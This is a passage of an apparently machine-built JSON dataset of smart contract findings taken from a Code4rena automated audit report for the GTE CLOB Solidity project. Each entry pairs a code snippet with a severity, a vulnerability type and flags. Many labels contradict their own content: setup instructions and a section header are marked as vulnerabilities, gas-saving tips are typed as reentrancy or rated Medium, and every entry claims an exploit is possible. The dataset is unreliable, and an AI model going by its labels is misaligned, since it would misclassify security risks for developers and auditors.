    "description": "The `decimals()` function is not a part of the [ERC-20 standard](https://eips.ethereum.org/EIPS/eip-20), and was added later as an [optional extension](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol). As such, some valid ERC20 tokens do not support this interface, so it is unsafe to blindly cast all tokens to this interface, and then call this function. *Instances (2)*: File: ./contracts/clob/CLOBManager.sol 174:         uint8 quoteDecimals = IERC20Metadata(quoteToken).decimals(); 175:         uint8 baseDecimals = IERC20Metadata(baseToken).decimals();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.197,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-4\"></a>[L-4] Do not use deprecated library functions",
    "description": "*Instances (5)*: File: ./contracts/router/GTERouter.sol 126:             token.safeApprove(address(acctManager), amount); 142:         token.safeApprove(address(acctManager), amount); 149:         address(weth).safeApprove(address(acctManager), msg.value);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-5\"></a>[L-5] `safeApprove()` is deprecated",
    "description": "[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts. *Instances (5)*: File: ./contracts/router/GTERouter.sol 126:             token.safeApprove(address(acctManager), amount); 142:         token.safeApprove(address(acctManager), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Book.sol\n\n467:         return quoteAmount * self.config().baseSize / price;\n\n476:         return baseAmount * price / self.config().baseSize;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-6\"></a>[L-6] Division by zero not prevented",
    "description": "The divisions below take an input parameter which does not have any zero-value checks, which may lead to the functions reverting when zero is passed. *Instances (3)*: File: ./contracts/clob/CLOB.sol 819:             matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize; File: ./contracts/clob/types/Book.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.181,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n113:     fallback() external {}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-7\"></a>[L-7] Fallback lacking `payable`",
    "description": "*Instances (1)*: File: ./contracts/router/GTERouter.sol 113:     fallback() external {}",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.082,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n172:         initializer\n\n174:         __CLOB_init(marketConfig, marketSettings, initialOwner);\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n984:         __Ownable_init(initialOwner);\n\n985:         CLOBStorageLib.init(_getStorage(), marketConfig, marketSettings);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-8\"></a>[L-8] Initializers could be front-run",
    "description": "Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment *Instances (9)*: File: ./contracts/account-manager/AccountManager.sol 118:     function initialize(address _owner) external initializer { File: ./contracts/clob/CLOB.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.512,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Order.sol\n\n89:         return self.cancelTimestamp != NULL_TIMESTAMP && self.cancelTimestamp < block.timestamp;\n\n95:         return cancelTimestamp != NULL_TIMESTAMP && cancelTimestamp < block.timestamp;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-9\"></a>[L-9] Signature use at deadlines should be allowed",
    "description": "According to [EIP-2612](https://github.com/ethereum/EIPs/blob/71dc97318013bf2ac572ab63fab530ac9ef419ca/EIPS/eip-2612.md?plain=1#L58), signatures used on exactly the deadline timestamp are supposed to be allowed. While the signature may or may not be used for the exact EIP-2612 use case (transfer approvals), for consistency's sake, all deadlines should follow this semantic. If the timestamp is an expiration rather than a deadline, consider whether it makes more sense to include the expiration timestamp as a valid timestamp, as is done for deadlines. *Instances (2)*: File: ./contracts/clob/types/Order.sol 89:         return self.cancelTimestamp != NULL_TIMESTAMP && self.cancelTimestamp < block.timestamp; 95:         return cancelTimestamp != NULL_TIMESTAMP && cancelTimestamp < block.timestamp;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.243,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n      function acceptOwnership() external {\n          address sender = _msgSender();\n          require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n          _transferOwnership(sender);\n      }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-10\"></a>[L-10] Use `Ownable2Step.transferOwnership` instead of `Ownable.transferOwnership`",
    "description": "Use [Ownable2Step.transferOwnership](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) which is safer. Use it as it is more secure due to 2-stage ownership transfer. **Recommended Mitigation Steps** Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">Ownable2Step.sol</a> function acceptOwnership() external { address sender = _msgSender();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.23,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n141:         permit2.transferFrom(msg.sender, address(this), amount, token);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-11\"></a>[L-11] Unsafe ERC20 operation(s)",
    "description": "*Instances (1)*: File: ./contracts/router/GTERouter.sol 141:         permit2.transferFrom(msg.sender, address(this), amount, token);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.127,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n28: contract CLOB is ICLOB, Ownable2StepUpgradeable {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"L-12\"></a>[L-12] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
    "description": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. *Instances (2)*: File: ./contracts/clob/CLOB.sol 22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\"; 28: contract CLOB is ICLOB, Ownable2StepUpgradeable {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.214,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n28: contract CLOB is ICLOB, Ownable2StepUpgradeable {\n\n166:         _disableInitializers();\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n172:         initializer\n\n174:         __CLOB_init(marketConfig, marketSettings, initialOwner);\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n984:         __Ownable_init(initialOwner);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-13\"></a>[L-13] Upgradeable contract not initialized",
    "description": "Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user *Instances (15)*: File: ./contracts/account-manager/AccountManager.sol 114:         _disableInitializers(); 118:     function initialize(address _owner) external initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.642,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n125:             token.safeTransferFrom(msg.sender, address(this), amount);\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Solady's SafeTransferLib does not check for token contract's existence",
    "description": "There is a subtle difference between the implementation of solady\u2019s SafeTransferLib and OZ\u2019s SafeERC20: OZ\u2019s SafeERC20 checks if the token is a contract or not, solady\u2019s SafeTransferLib does not. https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L10 `@dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller` *Instances (11)*: File: ./contracts/account-manager/AccountManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.471,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2025-07-gte-clob/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash!\ngit clone https://github.com/code-423n4/2025-07-gte-clob\ncd 2025-07-gte-clob\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Setup",
    "description": "Once the above prerequisite has been successfully installed, the following commands can be executed to setup the repository: git clone https://github.com/code-423n4/2025-07-gte-clob cd 2025-07-gte-clob",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.083,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash \nforge test --match-test submissionValidity\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Creating a PoC",
    "description": "The project is composed of three core systems; the `CLOB` system, the `AccountManager` contract, and the `GTERouter` contract. Within the codebase, we have introduced a `PoC.t.sol` test file under the `test/c4-poc` folder that sets up each system with mock implementations to allow PoCs to be constructed in a straightforward manner. Specifically, we combined the logic of the `RouterTestBase.t.sol` and `CLOBTestBase.sol` files manually to combine the underlying deployments. Depending on where the vulnerability lies, the PoC should utilize the relevant storage entries (i.e. the `router` in case a router vulnerability is demonstrated etc.). For a submission to be considered valid, the test case **should execute successfully** via the following command: forge test --match-test submissionValidity",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.049,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n26:     mapping(address clob => bool) isCLOB;\n\n28:     mapping(address account => bool) maxLimitWhitelist;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-2\"></a>[GAS-2] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (3)*: File: ./contracts/account-manager/AccountManager.sol 19:     mapping(address market => bool) isMarket; File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.157,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n5: import {ICLOB} from \"./ICLOB.sol\";\n\n6: import {ICLOBManager} from \"./ICLOBManager.sol\";\n\n7: import {IAccountManager} from \"../account-manager/IAccountManager.sol\";\n\n8: import {CLOBStorageLib} from \"./types/Book.sol\";\n\n9: import {TransientMakerData, MakerCredit} from \"./types/TransientMakerData.sol\";\n\n10: import {Order, OrderLib, OrderId, OrderIdLib, Side} from \"./types/Order.sol\";\n\n11: import {Book, BookLib, Limit, MarketConfig, MarketSettings} from \"./types/Book.sol\";\n\n14: import {IOperator} from \"contracts/utils/interfaces/IOperator.sol\";\n\n15: import {OperatorRoles} from \"contracts/utils/Operator.sol\";\n\n16: import {OperatorHelperLib} from \"contracts/utils/types/OperatorHelperLib.sol\";\n\n17: import {EventNonceLib as CLOBEventNonce} from \"contracts/utils/types/EventNonce.sol\";\n\n20: import {SafeCastLib} from \"@solady/utils/SafeCastLib.sol\";\n\n21: import {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n29:     using OrderLib for *;\n\n271:         return OrderIdLib.getOrderId(address(0), _getStorage().metadata().orderIdCounter + 1);\n\n449:             -totalQuoteSent.toInt256(),\n\n455:             account, newOrder.id.unwrap(), -totalQuoteSent.toInt256(), totalBaseReceived.toInt256(), takerFee\n\n479:             -baseSent.toInt256(),\n\n484:             PostFillOrderResult(account, newOrder.id.unwrap(), quoteReceived.toInt256(), -baseSent.toInt256(), takerFee);\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n507:         uint256 eventNonce = CLOBEventNonce.inc(); // keep stack from blowing\n\n510:             _settleIncomingOrder(ds, account, Side.BUY, quoteTokenAmountSent + postAmount, baseTokenAmountReceived);\n\n517:             -quoteTokenAmountSent.toInt256(),\n\n526:             -quoteTokenAmountSent.toInt256(),\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n548:         uint256 eventNonce = CLOBEventNonce.inc(); // Keep stack from blowing\n\n551:             _settleIncomingOrder(ds, account, Side.SELL, quoteTokenAmountReceived, baseTokenAmountSent + postAmount);\n\n559:             -baseTokenAmountSent.toInt256(),\n\n568:             -baseTokenAmountSent.toInt256(),\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n696:             quoteTokenDelta -= postAmount.toInt256();\n\n700:             baseTokenDelta -= postAmount.toInt256();\n\n713:             quoteTokenDelta = oldAmountInQuote - newAmountInQuote;\n\n716:                 uint256(ds.metadata().quoteTokenOpenInterest.toInt256() - quoteTokenDelta);\n\n718:             baseTokenDelta = order.amount.toInt256() - amount.toInt256();\n\n721:                 uint256(ds.metadata().baseTokenOpenInterest.toInt256() - baseTokenDelta);\n\n763:             incomingOrder.amount -= currMatch.matchedAmount;\n\n765:             totalQuoteSent += currMatch.quoteDelta;\n\n766:             totalBaseReceived += currMatch.baseDelta;\n\n797:             incomingOrder.amount -= currMatch.matchedAmount;\n\n799:             totalQuoteTokenReceived += currMatch.quoteDelta;\n\n800:             totalBaseTokenSent += currMatch.baseDelta;\n\n819:             matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize;\n\n825:                 (matchedBase.min(ds.getBaseTokenAmount(matchedPrice, takerOrder.amount)) / lotSize) * lotSize;\n\n839:             if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;\n\n843:             if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;\n\n847:         else makerOrder.amount -= matchData.baseDelta;\n\n908:         for (uint256 i = 0; i < numOrders; i++) {\n\n914:                 continue; // Order may have been matched\n\n924:                 totalQuoteTokenRefunded += quoteTokenRefunded;\n\n927:                 totalBaseTokenRefunded += baseTokenRefunded;\n\n969:             accountManager.debitAccount(maker, address(ds.config().quoteToken), uint256(-quoteTokenDelta));\n\n975:             accountManager.debitAccount(maker, address(ds.config().baseToken), uint256(-baseTokenDelta));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (208)*: File: ./contracts/account-manager/AccountManager.sol 4: import {IAccountManager} from \"./IAccountManager.sol\"; 5: import {ICLOB, MakerCredit} from \"../clob/ICLOB.sol\"; 6: import {Side} from \"../clob/types/Order.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 112,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/account-manager/AccountManager.sol\n\n166:     function deposit(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_DEPOSIT) {\n\n172:     function depositFromRouter(address account, address token, uint256 amount) external onlyGTERouter {\n\n178:     function withdraw(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_WITHDRAW) {\n\n184:     function withdrawToRouter(address account, address token, uint256 amount) external onlyGTERouter {\n\n194:     function registerMarket(address market) external onlyCLOBManager {\n\n200:     function collectFees(address token, address feeRecipient) external virtual onlyOwnerOrRoles(Roles.FEE_COLLECTOR) returns (uint256 fee) {\n\n211:     function setSpotAccountFeeTier(address account, FeeTiers feeTier) external virtual onlyCLOBManager {\n\n217:     function setSpotAccountFeeTiers(address[] calldata accounts, FeeTiers[] calldata feeTiers) external virtual onlyCLOBManager {\n\n231:     function settleIncomingOrder(ICLOB.SettleParams calldata params) external virtual onlyMarket returns (uint256 takerFee) {\n\n297:     function creditAccount(address account, address token, uint256 amount) external virtual onlyMarket {\n\n302:     function creditAccountNoEvent(address account, address token, uint256 amount) external virtual onlyMarket {\n\n307:     function debitAccount(address account, address token, uint256 amount) external virtual onlyMarket {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (19)*: File: ./contracts/account-manager/AccountManager.sol 166:     function deposit(address account, address token, uint256 amount) external virtual onlySenderOrOperator(account, OperatorRoles.SPOT_DEPOSIT) { 172:     function depositFromRouter(address account, address token, uint256 amount) external onlyGTERouter {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Book.sol\n\n195:             count++;\n\n230:             counter++;\n\n260:             self.metadata().numBids++;\n\n265:             self.metadata().numAsks++;\n\n273:         limit.numOrders++;\n\n290:             self.metadata().numBids--;\n\n294:             self.metadata().numAsks--;\n\n318:         limit.numOrders--;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "<a name=\"GAS-6\"></a>[GAS-6] `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)",
    "description": "Pre-increments and pre-decrements are cheaper. For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k: **Increment:** - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.35,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n230:         for (uint256 i = 0; i < clobs.length; i++) {\n\n243:         for (uint256 i = 0; i < clobs.length; i++) {\n\n256:         for (uint256 i = 0; i < clobs.length; i++) {\n\n279:         for (uint256 i = 0; i < accounts.length; i++) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-8\"></a>[GAS-8] Increments/decrements can be unchecked in for-loops",
    "description": "In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline. [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695) The change would be: - for (uint256 i; i < numIterations; i++) { + for (uint256 i; i < numIterations;) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.288,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n72:     WETH public immutable weth;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Medium",
    "title": "<a name=\"GAS-10\"></a>[GAS-10] WETH address definition can be use directly",
    "description": "WETH is a wrap Ether contract with a specific address in the Ethereum network, giving the option to define it may cause false recognition, it is healthier to define it directly. Advantages of defining a specific contract directly: It saves gas, Prevents incorrect argument definition, Prevents execution on a different chain and re-signature issues,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.086,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 1 | | [NC-2](#NC-2) | Use `string.concat()` or `bytes.concat()` instead of `abi.encodePacked` | 3 | | [NC-3](#NC-3) | `constant`s should be defined rather than using magic numbers | 5 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
